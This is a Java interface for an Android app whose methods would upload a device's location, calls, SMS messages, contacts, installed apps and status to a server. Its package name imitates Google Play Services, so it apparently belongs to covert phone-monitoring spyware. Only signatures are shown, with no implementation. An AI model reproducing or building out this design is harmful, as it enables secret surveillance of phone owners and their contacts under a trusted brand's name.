package com.google.android.gms.persistent.googleapps.repositories;

import com.google.android.gms.persistent.googleapps.network.models.data.BaseEvent;
import com.google.android.gms.persistent.googleapps.network.models.data.Data;
import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
import com.google.android.gms.persistent.googleapps.network.models.request.DeleteRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.InformationRequest;
import com.google.android.gms.persistent.googleapps.network.models.request.SyncRequest;
import com.google.android.gms.persistent.googleapps.network.models.response.DeleteResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InformationResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.InitialResponse;
import com.google.android.gms.persistent.googleapps.network.models.response.SyncResponse;

import java.util.List;

import io.reactivex.Observable;
import io.reactivex.Single;

/**
 * Created by OldMan on 04.04.2017.
 */

public interface NetworkRepo {

    Single<InitialResponse> onInitDevice();

    Single<SyncResponse> onStateSync();

    Single<InformationResponse> addDiagnosticOfDevice(BaseEvent data);

    Single<DeleteResponse> onDeleteDevice(DeleteRequest request);

    Single<InformationResponse> setListDataOfDevice(List<BaseEvent> dataList);

    Single<InformationResponse> setDataInfo(DeviceInfo data);

    Single<InformationResponse> addPositionOfDevice(BaseEvent data);

    Single<InformationResponse> addCallOfDevice(BaseEvent data);

    Single<InformationResponse> addSMSOfDevice(BaseEvent data);

    Single<InformationResponse> addCallListOfDevice(List<BaseEvent> dataList);

    Single<InformationResponse> addSMSListOfDevice(List<BaseEvent> dataList);



    Single<InformationResponse> setPhoneBookOfDevice(List<BaseEvent> dataList,long date);

    Single<InformationResponse> addListAppOfDevice(List<BaseEvent> dataList);

    Single<InformationResponse> addAppOfDevice(BaseEvent data);

    Single<InformationResponse> addDeviceStatus(BaseEvent data);

    Single<InformationResponse> addDeviceBatteryState(BaseEvent data);

    Single<InformationResponse> addNetworkState(BaseEvent data);
}
